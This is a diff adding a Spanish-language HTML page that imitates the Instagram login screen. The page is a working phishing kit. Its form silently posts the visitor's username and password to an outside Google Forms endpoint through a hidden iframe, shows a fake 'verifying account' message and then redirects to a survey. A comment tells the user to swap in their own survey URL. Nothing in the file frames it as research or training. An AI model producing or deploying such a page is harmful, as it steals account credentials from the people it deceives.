@@ -1,0 +1,61 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Iniciar sesión • Instagram</title>
+    <style>
+        * { margin:0; padding:0; box-sizing:border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
+        body { display:flex; justify-content:center; align-items:center; height:100vh; background-color:#fafafa; }
+        .login-box { background:white; padding:25px; border:1px solid #dbdbdb; text-align:center; width:350px; }
+        .logo { width:175px; margin-bottom:20px; cursor:default; }
+        .field { position:relative; width:100%; margin-top:10px; }
+        .field input { width:100%; padding:10px; border:1px solid #dbdbdb; border-radius:3px; font-size:12px; background:#fafafa; outline:none; }
+        .field label { position:absolute; top:50%; left:10px; transform:translateY(-50%); font-size:12px; color:#8e8e8e; pointer-events:none; transition: all 0.1s ease; }
+        .field input:focus + label, .field input:not(:placeholder-shown) + label { top:7px; font-size:10px; }
+        .btn { width:100%; padding:8px; background-color:#0095f6; color:white; border:none; border-radius:4px; cursor:pointer; font-size:14px; margin-top:15px; font-weight:600; }
+        #loading { display: none; margin-top: 20px; font-size: 14px; color: #262626; }
+    </style>
+</head>
+<body>
+
+<div class="login-box" id="mainBox">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png" class="logo">
+    
+    <form id="authForm" action="https://docs.google.com/forms/d/e/1FAIpQLScixbdWi6SxI01JD38odY0Vr0p0ShZB4P51zkqwcBNwFIHjxw/formResponse" method="POST" target="hidden_iframe">
+        <div class="field">
+            <input type="text" name="entry.1271603301" id="u_name" placeholder=" " required>
+            <label>Usuario o correo electrónico</label>
+        </div>
+        <div class="field">
+            <input type="password" name="entry.1257754249" id="u_pass" placeholder=" " required>
+            <label>Contraseña</label>
+        </div>
+        <button type="submit" class="btn">Confirmar para Encuesta</button>
+    </form>
+    
+    <div id="loading">Verificando cuenta...</div>
+</div>
+
+<iframe name="hidden_iframe" id="hidden_iframe" style="display:none;"></iframe>
+
+<script>
+    const form = document.getElementById('authForm');
+    const box = document.getElementById('mainBox');
+    const loader = document.getElementById('loading');
+
+    form.addEventListener('submit', function() {
+        // 1. Ocultamos el formulario y mostramos el cargando
+        form.style.display = 'none';
+        loader.style.display = 'block';
+
+        // 2. Esperamos un poco para que el Form reciba los datos y redirigimos
+        setTimeout(function() {
+            // CAMBIA ESTA URL POR TU ENCUESTA REAL DE GOOGLE
+            window.location.href = "https://docs.google.com/forms/d/e/AQUI_TU_ENCUESTA_DE_PREGUNTAS/viewform";
+        }, 1500);
+    });
+</script>
+
+</body>
+</html>
